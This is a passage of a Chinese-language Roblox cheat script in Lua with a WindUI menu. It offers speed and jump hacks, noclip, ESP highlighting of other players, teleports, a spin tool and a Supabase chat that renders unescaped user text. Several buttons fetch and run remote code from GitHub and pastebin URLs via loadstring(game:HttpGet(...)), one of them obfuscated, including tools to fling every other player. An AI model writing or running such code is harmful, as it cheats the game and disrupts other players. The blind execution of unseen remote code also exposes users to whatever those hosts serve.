Input.TextColor3 = Color3.new(1, 1, 1)
Input.Font = Enum.Font.Gotham
Input.TextSize = 12
Input.ZIndex = 3
Instance.new("UICorner", Input).CornerRadius = UDim.new(0, 6)

-- === 手机端优化拖动逻辑 ===
local dragging = false
local dragStart, startPos

Background.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Background.Position
        
        local connection
        connection = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
                connection:Disconnect()
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        Background.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- === API 交互 ===
local function sbRequest(method, path, body)
    local req = (syn and syn.request) or (http and http.request) or request
    if not req then return nil end
    return req({
        Url = SB_URL .. "/rest/v1" .. path,
        Method = method,
        Headers = {
            ["apikey"] = SB_KEY,
            ["Authorization"] = "Bearer " .. SB_KEY,
            ["Content-Type"] = "application/json",
            ["Prefer"] = "return=representation"
        },
        Body = body and HttpService:JSONEncode(body) or nil
    })
end

Input.FocusLost:Connect(function(enter)
    if enter and Input.Text ~= "" then
        local content = Input.Text
        Input.Text = "正在发送..."
        task.spawn(function()
            sbRequest("POST", "/global_chat", {sender_name = player.Name, content = content})
            Input.Text = ""
        end)
    end
end)

task.spawn(function()
    while Background do
        local res = sbRequest("GET", "/global_chat?order=created_at.desc&limit=25", nil)
        if res and res.StatusCode == 200 then
            local data = HttpService:JSONDecode(res.Body)
            Scroll:ClearAllChildren()
            Instance.new("UIListLayout", Scroll).Padding = UDim.new(0, 4)
            for i = #data, 1, -1 do
                local msg = data[i]
                local lbl = Instance.new("TextLabel", Scroll)
                lbl.Size = UDim2.new(1, 0, 0, 0); lbl.AutomaticSize = Enum.AutomaticSize.Y
                lbl.BackgroundTransparency = 1; lbl.RichText = true; lbl.ZIndex = 3
                lbl.Text = "<b><font color='#00f3ff'>" .. msg.sender_name .. "</font></b>: " .. msg.content
                lbl.TextColor3 = Color3.new(1, 1, 1); lbl.TextXAlignment = Enum.TextXAlignment.Left
                lbl.TextWrapped = true; lbl.Font = Enum.Font.Gotham; lbl.TextSize = 11
            end
        end
        task.wait(4)
    end
end)

        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "通用飞",
    Desc = "好用",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E9%A3%9E%E8%A1%8C%E8%84%9A%E6%9C%ACV3(%E5%85%A8%E6%B8%B8%E6%88%8F%E9%80%9A%E7%94%A8)%20(1).txt"))()
        WindUI:Notify({
            Title = "飞",
            Content = "飞行",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "飞车",
    Desc = "通用",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lmlmlm7891/cnmsjwnrnmbdsmdx/refs/heads/main/obfuscated_script-1770182843441.lua.txt"))()
        WindUI:Notify({
            Title = "LM飞车",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Slider = Tab:Slider({
    Title = "速度",
    Desc = "修改移速",
    Step = 1,
    Value = {
        Min = 0,
        Max = 150,
        Default = 16,
    },
    Callback = function(value)
        -- 修改移动速度
        local player = game.Players.LocalPlayer
        local character = player.Character
                WindUI:Notify({
            Title = "移动速度",
            Content = "已设置为: " .. value,
            Icon = "crown",
            Duration = 3
        })
        if character and character:FindFirstChildOfClass("Humanoid") then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            humanoid.WalkSpeed = value
        end
        
        print(value)

-- 角色重生时自动重新应用速度设置
game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    wait(1) -- 等待角色完全加载
    if character:FindFirstChildOfClass("Humanoid") then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local currentValue = Slider:GetValue()
        humanoid.WalkSpeed = currentValue
    end
end)

-- 初始应用（如果已有角色）
if game.Players.LocalPlayer.Character then
    spawn(function()
        wait(1)
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChildOfClass("Humanoid") then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            local currentValue = Slider:GetValue()
            humanoid.WalkSpeed = currentValue
         end
     end)
  end
end
})

local Slider = Tab:Slider({
    Title = "跳跃高度",
    Desc = "修改跳跃高度",
    Step = 1,
    Value = {
        Min = 0,
        Max = 500,
        Default = 50,
    },
    Callback = function(value)
        local player = game:GetService("Players").LocalPlayer
        if player and player.Character then
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                -- 核心逻辑：确保启用 JumpPower 并赋值
                humanoid.UseJumpPower = true
                humanoid.JumpPower = value
            end
        end
    end
})

local Toggle = Tab:Toggle({
    Title = "无限跳",
    Desc = "",
    Icon = "badge-check",
    Type = "Checkbox",
    Value = false, -- 默认值
    Callback = function(state)
        local InfiniteJumpEnabled = state
        
        -- 无限跳功能
        local function infiniteJump()
            if InfiniteJumpEnabled then
                -- 监听输入
                game:GetService("UserInputService").JumpRequest:Connect(function()
                    if InfiniteJumpEnabled then
                        -- 获取本地玩家
                        local player = game.Players.LocalPlayer
                        if player and player.Character then
                            -- 给角色一个向上的力来实现跳跃
                            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                            if humanoid then
                                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            end
                        end
                    end
                end)
            end
        end
        
        -- 启动无限跳
        infiniteJump()
    end
})

local Toggle = Tab:Toggle({
    Title = "穿墙",
    Desc = "",
    Icon = "badge-check",
    Type = "Checkbox",
    Value = false, -- default value
    Callback = function(state)
        _G.NoclipEnabled = state
        
        if state then
            -- 开启穿墙
            _G.NoclipConnection = game:GetService("RunService").Stepped:Connect(function()
                if _G.NoclipEnabled then
                    pcall(function()
                        local character = game.Players.LocalPlayer.Character
                        if character then
                            for _, part in pairs(character:GetDescendants()) do
                                if part:IsA("BasePart") then
                                    part.CanCollide = false
                                end
                            end
                        end
                    end)
                end
            end)
        else
            -- 关闭时只需要断开连接
            if _G.NoclipConnection then
                _G.NoclipConnection:Disconnect()
                _G.NoclipConnection = nil
            end
            -- 不修改任何碰撞属性，让游戏自然处理
        end
    end
})

local Toggle = Tab:Toggle({
    Title = "夜视",
    Desc = "",
    Icon = "badge-check",
    Type = "Checkbox",
    Value = false, -- default value
    Callback = function(state) 
        pcall(function()
            if state then
                game.Lighting.Ambient = Color3.new(1, 1, 1)
            else
                game.Lighting.Ambient = Color3.new(0, 0, 0)
            end
        end)
    end
})

local Button = Tab:Button({
    Title = "透视",
    Desc = "不可关",
    Locked = false,
    Callback = function()
           while wait(1) do
local players = game.Players:GetPlayers()

for i,v in pairs(players) do
 local esp = Instance.new("Highlight")
 esp.Name = v.Name
 esp.FillTransparency = 0.5
 esp.FillColor = Color3.new(0, 0, 0)
 esp.OutlineColor = Color3.new(255, 255, 255)
 esp.OutlineTransparency = 0
 esp.Parent = v.Character
end
end
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "触碰甩飞",
    Desc = "甩飞",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "点击传送",
    Desc = "点击传送",
    Locked = false,
    Callback = function()
        mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "点击传送"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack
        WindUI:Notify({
            Title = "加载成功",
            Content = "点击传送",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "转圈",
    Desc = "",
    Locked = false,
    Callback = function()
-- 创建UI元素
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RotationUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 100
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- 主框架
local MainFrame = Instance.new("Frame")
MainFrame.Name = "RotationFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 130)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -65)
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MainFrame.BackgroundTransparency = 0.3
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- 标题栏
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TitleBar.BackgroundTransparency = 0.5
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

-- 标题文本
local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(0.7, 0, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "旋转控制"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.Font = Enum.Font.Gotham
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextYAlignment = Enum.TextYAlignment.Center
Title.Parent = TitleBar

-- 最小化按钮
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Position = UDim2.new(1, -60, 0, 0)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(80, 160, 220)
MinimizeButton.Text = "_"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextSize = 20
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.Parent = TitleBar

-- 关闭按钮
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -30, 0, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 18
CloseButton.Font = Enum.Font.Gotham
CloseButton.Parent = TitleBar

-- 内容区域
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, 0, 1, -30)
ContentFrame.Position = UDim2.new(0, 0, 0, 30)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

-- 旋转控制按钮
local RotateButton = Instance.new("TextButton")
RotateButton.Name = "RotateButton"
RotateButton.Size = UDim2.new(0.8, 0, 0, 40)
RotateButton.Position = UDim2.new(0.1, 0, 0.1, 0)
RotateButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
RotateButton.Text = "开始旋转"
RotateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
RotateButton.TextSize = 16
RotateButton.Font = Enum.Font.GothamBold
RotateButton.Parent = ContentFrame

-- 速度输入区域
local SpeedInputFrame = Instance.new("Frame")
SpeedInputFrame.Name = "SpeedInputFrame"
SpeedInputFrame.Size = UDim2.new(0.8, 0, 0, 50)
SpeedInputFrame.Position = UDim2.new(0.1, 0, 0.7, 0)
SpeedInputFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
SpeedInputFrame.BackgroundTransparency = 0.5
SpeedInputFrame.BorderSizePixel = 0
SpeedInputFrame.Parent = ContentFrame

local SpeedLabel = Instance.new("TextLabel")
SpeedLabel.Name = "SpeedLabel"
SpeedLabel.Size = UDim2.new(1, 0, 0.4, 0)
SpeedLabel.Position = UDim2.new(0, 5, 0, 0)
SpeedLabel.BackgroundTransparency = 1
SpeedLabel.Text = "旋转速度 (1-10000):"
SpeedLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
SpeedLabel.TextSize = 12
SpeedLabel.TextXAlignment = Enum.TextXAlignment.Left
SpeedLabel.TextYAlignment = Enum.TextYAlignment.Center
SpeedLabel.Parent = SpeedInputFrame

local SpeedInputBox = Instance.new("TextBox")
SpeedInputBox.Name = "SpeedInputBox"
SpeedInputBox.Size = UDim2.new(0.9, 0, 0.5, 0)
SpeedInputBox.Position = UDim2.new(0.05, 0, 0.45, 0)
SpeedInputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
SpeedInputBox.BorderSizePixel = 1
SpeedInputBox.BorderColor3 = Color3.fromRGB(100, 100, 100)
SpeedInputBox.Text = "500"
SpeedInputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
SpeedInputBox.TextSize = 14
SpeedInputBox.TextXAlignment = Enum.TextXAlignment.Center
SpeedInputBox.PlaceholderText = "输入1-10000"
SpeedInputBox.ClearTextOnFocus = false
SpeedInputBox.Parent = SpeedInputFrame

-- 最小化后的按钮
local MiniButton = Instance.new("TextButton")
MiniButton.Name = "MiniButton"
MiniButton.Size = UDim2.new(0, 60, 0, 35)
MiniButton.Position = UDim2.new(0, 20, 0, 20) -- 默认位置
MiniButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
MiniButton.BackgroundTransparency = 0.3
MiniButton.BorderSizePixel = 1
MiniButton.BorderColor3 = Color3.fromRGB(100, 100, 100)
MiniButton.Text = "旋转"
MiniButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MiniButton.TextSize = 14
MiniButton.Font = Enum.Font.Gotham
MiniButton.Visible = false
MiniButton.Active = true
MiniButton.Draggable = true
MiniButton.Parent = ScreenGui

-- 旋转控制变量
local isRotating = false
local rotationSpeed = 500
local connection

-- 新增：记录位置
local savedMiniButtonPosition = UDim2.new(0, 20, 0, 20) -- 初始位置
local savedMainFramePosition = MainFrame.Position -- 记录主窗口位置

-- 记录MiniButton位置的函数
local function saveMiniButtonPosition()
    savedMiniButtonPosition = MiniButton.Position
end

-- 记录MainFrame位置的函数
local function saveMainFramePosition()
    savedMainFramePosition = MainFrame.Position
end

-- 设置MiniButton位置监听
game:GetService("RunService").Heartbeat:Connect(function()
    if MiniButton.Visible then
        saveMiniButtonPosition()
    else
        saveMainFramePosition()
    end
end)

-- 旋转函数
local function rotateCharacter()
    if isRotating then
        local player = game.Players.LocalPlayer
        if player and player.Character then
            local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                local speedMultiplier = rotationSpeed / 100
                humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(speedMultiplier), 0)
            end
        end
    end
end

-- 更新速度函数
local function updateSpeed()
    local text = SpeedInputBox.Text
    if text == "" then
        rotationSpeed = 500
        SpeedInputBox.Text = "500"
        return
    end
    
    local num = tonumber(text)
    if num then
        if num < 1 then
            rotationSpeed = 1
            SpeedInputBox.Text = "1"
        elseif num > 10000 then
            rotationSpeed = 10000
            SpeedInputBox.Text = "10000"
        else
            rotationSpeed = math.floor(num + 0.5)
            SpeedInputBox.Text = tostring(rotationSpeed)
        end
    else
        rotationSpeed = 500
        SpeedInputBox.Text = "500"
    end
end

-- 输入框验证
SpeedInputBox.FocusLost:Connect(function()
    updateSpeed()
end)

SpeedInputBox:GetPropertyChangedSignal("Text"):Connect(function()
    if SpeedInputBox:IsFocused() then
        local text = SpeedInputBox.Text
        local newText = string.gsub(text, "[^0-9]", "")
        if newText ~= text then
            SpeedInputBox.Text = newText
        end
    end
end)

-- 旋转按钮点击事件
local function toggleRotation()
    isRotating = not isRotating
    
    if isRotating then
        RotateButton.Text = "停止旋转"
        RotateButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        MiniButton.Text = "旋转中"
        MiniButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
        
        if connection then
            connection:Disconnect()
        end
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            rotateCharacter()
        end)
    else
        RotateButton.Text = "开始旋转"
        RotateButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
        MiniButton.Text = "旋转"
        MiniButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
        
        if connection then
            connection:Disconnect()
            connection = nil
        end
    end
end

RotateButton.MouseButton1Click:Connect(toggleRotation)

-- 修复：最小化按钮点击事件 - 记录主窗口位置并使用保存的小按钮位置
MinimizeButton.MouseButton1Click:Connect(function()
    -- 保存主窗口当前位置
    saveMainFramePosition()
    
    -- 显示小按钮，使用上次保存的位置
    MainFrame.Visible = false
    MiniButton.Visible = true
    MiniButton.Position = savedMiniButtonPosition
    
    print("已最小化，小按钮位置:", 
        math.floor(savedMiniButtonPosition.X.Offset), 
        math.floor(savedMiniButtonPosition.Y.Offset))
end)

-- 修复：小按钮点击事件 - 恢复窗口并记录小按钮位置
MiniButton.MouseButton1Click:Connect(function()
    -- 保存小按钮当前位置
    saveMiniButtonPosition()
    
    -- 恢复主窗口，使用上次保存的主窗口位置
    MainFrame.Visible = true
    MiniButton.Visible = false
    MainFrame.Position = savedMainFramePosition
    
    print("已恢复，主窗口位置:", 
        math.floor(savedMainFramePosition.X.Offset), 
        math.floor(savedMainFramePosition.Y.Offset))
end)

-- 小按钮右键点击（切换旋转状态）
MiniButton.MouseButton2Click:Connect(toggleRotation)

-- 关闭按钮事件
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- 鼠标悬停效果
RotateButton.MouseEnter:Connect(function()
    if not isRotating then
        RotateButton.BackgroundColor3 = Color3.fromRGB(80, 140, 220)
    end
end)

RotateButton.MouseLeave:Connect(function()
    if not isRotating then
        RotateButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
    end
end)

MinimizeButton.MouseEnter:Connect(function()
    MinimizeButton.BackgroundColor3 = Color3.fromRGB(100, 180, 240)
end)

MinimizeButton.MouseLeave:Connect(function()
    MinimizeButton.BackgroundColor3 = Color3.fromRGB(80, 160, 220)
end)

CloseButton.MouseEnter:Connect(function()
    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
end)

CloseButton.MouseLeave:Connect(function()
    CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
end)

MiniButton.MouseEnter:Connect(function()
    MiniButton.BackgroundTransparency = 0.1
    MiniButton.BorderColor3 = Color3.fromRGB(150, 150, 150)
end)

MiniButton.MouseLeave:Connect(function()
    MiniButton.BackgroundTransparency = 0.3
    MiniButton.BorderColor3 = Color3.fromRGB(100, 100, 100)
end)

SpeedInputBox.MouseEnter:Connect(function()
    SpeedInputBox.BorderColor3 = Color3.fromRGB(120, 120, 120)
end)

SpeedInputBox.MouseLeave:Connect(function()
    if not SpeedInputBox:IsFocused() then
        SpeedInputBox.BorderColor3 = Color3.fromRGB(100, 100, 100)
    end
end)

SpeedInputBox.Focused:Connect(function()
    SpeedInputBox.BorderColor3 = Color3.fromRGB(60, 120, 200)
end)

SpeedInputBox.FocusLost:Connect(function()
    SpeedInputBox.BorderColor3 = Color3.fromRGB(100, 100, 100)
end)

-- 初始化
updateSpeed()

-- 清理函数
local function cleanup()
    if connection then
        connection:Disconnect()
        connection = nil
    end
    isRotating = false
    RotateButton.Text = "开始旋转"
    RotateButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
    MiniButton.Text = "旋转"
    MiniButton.BackgroundColor3 = Color3.fromRGB(60, 120, 200)
end

-- 角色重生时清理
game.Players.LocalPlayer.CharacterAdded:Connect(cleanup)

-- 添加快捷键
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.Up then
        rotationSpeed = math.min(rotationSpeed + 100, 10000)
        SpeedInputBox.Text = tostring(rotationSpeed)
    elseif input.KeyCode == Enum.KeyCode.Down then
        rotationSpeed = math.max(rotationSpeed - 100, 1)
        SpeedInputBox.Text = tostring(rotationSpeed)
    end
end)
        WindUI:Notify({
            Title = "转圈",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "防甩飞",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/AntiFling.lua"))()
        WindUI:Notify({
            Title = "防甩",
            Content = "防甩",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "甩所有人",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "秒互动",
    Desc = "",
    Locked = false,
    Callback = function()
local ProximityPromptService = game:GetService("ProximityPromptService")

local lastInteractionTime = 0
local INTERACTION_DELAY = 0.5 -- 0.5秒互动一次

ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
    local currentTime = tick()
    
    -- 检查是否达到互动间隔
    if currentTime - lastInteractionTime >= INTERACTION_DELAY then
        fireproximityprompt(prompt)
        lastInteractionTime = currentTime
    end
end)
        WindUI:Notify({
            Title = "秒互动",
            Content = "已加载",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "传送到玩家位置",
    Desc = "",
    Locked = false,
    Callback = function()
        local Players = game:GetService("Players")

local TweenService = game:GetService("TweenService")

local UserInputService = game:GetService("UserInputService")


local player = Players.LocalPlayer


local screenGui = Instance.new("ScreenGui")

screenGui.Name = "TeleportUI"

screenGui.ResetOnSpawn = false


local mainFrame = Instance.new("Frame")

mainFrame.Size = UDim2.new(0, 200, 0, 280)

mainFrame.Position = UDim2.new(0, 10, 0, 10)

mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

mainFrame.BorderSizePixel = 0

mainFrame.Active = true

mainFrame.Draggable = true

mainFrame.Parent = screenGui


local titleBar = Instance.new("Frame")

titleBar.Size = UDim2.new(1, 0, 0, 25)

titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

titleBar.BorderSizePixel = 0

titleBar.Parent = mainFrame


local titleLabel = Instance.new("TextLabel")

titleLabel.Size = UDim2.new(1, 0, 1, 0)

titleLabel.BackgroundTransparency = 1

titleLabel.Text = "传送"

titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

titleLabel.TextSize = 14

titleLabel.Font = Enum.Font.Gotham

titleLabel.Parent = titleBar


local closeButton = Instance.new("TextButton")

closeButton.Size = UDim2.new(0, 25, 0, 25)

closeButton.Position = UDim2.new(1, -25, 0, 0)

closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)

closeButton.BorderSizePixel = 0

closeButton.Text = "X"

closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)

closeButton.TextSize = 12

closeButton.Font = Enum.Font.GothamBold

closeButton.Parent = titleBar


local scrollFrame = Instance.new("ScrollingFrame")

scrollFrame.Size = UDim2.new(1, -10, 1, -35)

scrollFrame.Position = UDim2.new(0, 5, 0, 30)

scrollFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)

scrollFrame.BorderSizePixel = 0

scrollFrame.ScrollBarThickness = 6

scrollFrame.Parent = mainFrame


local function teleportToPlayer(targetPlayer)

local character = player.Character

local targetCharacter = targetPlayer.Character

if not character or not targetCharacter then

return false

end

local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

local targetRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")

if not humanoidRootPart or not targetRootPart then

return false

end

local success = false

pcall(function()

humanoidRootPart.CFrame = targetRootPart.CFrame * CFrame.new(0, 0, 4)

success = true

end)

if not success then

pcall(function()

character:MoveTo(targetRootPart.Position + Vector3.new(0, 0, 4))

success = true

end)

end

return success

end


local function createPlayerButton(playerName, playerObj, index)

local button = Instance.new("TextButton")

button.Size = UDim2.new(1, -10, 0, 30)

button.Position = UDim2.new(0, 5, 0, (index - 1) * 35)

button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

button.BorderSizePixel = 0

button.Text = playerName

button.TextColor3 = Color3.fromRGB(255, 255, 255)

button.TextSize = 12

button.Font = Enum.Font.Gotham

button.AutoButtonColor = true

button.MouseEnter:Connect(function()

button.BackgroundColor3 = Color3.fromRGB(80, 80, 80)

end)

button.MouseLeave:Connect(function()

button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

end)

button.MouseButton1Click:Connect(function()

teleportToPlayer(playerObj)

end)

return button

end


local function updatePlayerList()

for _, child in ipairs(scrollFrame:GetChildren()) do

if child:IsA("TextButton") then

child:Destroy()

end

end

local playerIndex = 0

for _, otherPlayer in ipairs(Players:GetPlayers()) do

if otherPlayer ~= player then

playerIndex = playerIndex + 1

local button = createPlayerButton(otherPlayer.Name, otherPlayer, playerIndex)

button.Parent = scrollFrame

end

end

scrollFrame.CanvasSize = UDim2.new(0, 0, 0, playerIndex * 35)

end


closeButton.MouseButton1Click:Connect(function()

screenGui.Enabled = false

end)


UserInputService.InputBegan:Connect(function(input, gameProcessed)

if gameProcessed then return end

if input.KeyCode == Enum.KeyCode.RightShift then

screenGui.Enabled = not screenGui.Enabled

end

end)


if player:FindFirstChild("PlayerGui") then

screenGui.Parent = player.PlayerGui

else

player:WaitForChild("PlayerGui")

screenGui.Parent = player.PlayerGui

end


updatePlayerList()


Players.PlayerAdded:Connect(updatePlayerList)

Players.PlayerRemoved:Connect(updatePlayerList)


        WindUI:Notify({
            Title = "加载成功",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "保存位置加传送",
    Desc = "",
    Locked = false,
    Callback = function()
        local Players = game:GetService("Players")
local Player = Players.LocalPlayer

-- 防止重复注入，先清理旧UI
if Player.PlayerGui:FindFirstChild("SimpleTpUI") then
    Player.PlayerGui.SimpleTpUI:Destroy()
end

-- 创建主UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SimpleTpUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = Player:WaitForChild("PlayerGui")

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 200, 0, 260)
MainFrame.Position = UDim2.new(0.5, -100, 0.4, -130)
MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true -- 基础拖动支持
MainFrame.Parent = ScreenGui

-- 标题栏
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 35)
TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TitleBar.Parent = MainFrame

local TitleText = Instance.new("TextLabel")
TitleText.Size = UDim2.new(1, -70, 1, 0)
TitleText.Position = UDim2.new(0, 10, 0, 0)
TitleText.Text = "坐标保存传送"
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.BackgroundTransparency = 1
TitleText.TextXAlignment = Enum.TextXAlignment.Left
TitleText.Font = Enum.Font.SourceSansBold
TitleText.TextSize = 16
TitleText.Parent = TitleBar

-- [X] 关闭按钮
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 35, 0, 35)
CloseBtn.Position = UDim2.new(1, -35, 0, 0)
CloseBtn.Text = "X"
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextSize = 18
CloseBtn.Parent = TitleBar

-- [-] 最小化按钮
local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 35, 0, 35)
MinBtn.Position = UDim2.new(1, -70, 0, 0)
MinBtn.Text = "-"
MinBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinBtn.TextSize = 20
MinBtn.Parent = TitleBar

-- 列表容器
local Container = Instance.new("ScrollingFrame")
Container.Size = UDim2.new(1, -10, 1, -45)
Container.Position = UDim2.new(0, 5, 0, 40)
Container.BackgroundTransparency = 1
Container.CanvasSize = UDim2.new(0, 0, 0, 0)
Container.AutomaticCanvasSize = Enum.AutomaticSize.Y
Container.ScrollBarThickness = 4
Container.Parent = MainFrame

local Layout = Instance.new("UIListLayout")
Layout.Parent = Container
Layout.Padding = UDim.new(0, 5)

-- ================= 功能逻辑 =================

-- 1. 关闭与最小化
CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

local isMinimized = false
MinBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    Container.Visible = not isMinimized
    MainFrame.Size = isMinimized and UDim2.new(0, 200, 0, 35) or UDim2.new(0, 200, 0, 260)
end)

-- 2. 保存位置按钮
local SaveBtn = Instance.new("TextButton")
SaveBtn.Size = UDim2.new(1, 0, 0, 40)
SaveBtn.Text = "+ 保存当前位置"
SaveBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
SaveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SaveBtn.Font = Enum.Font.SourceSansBold
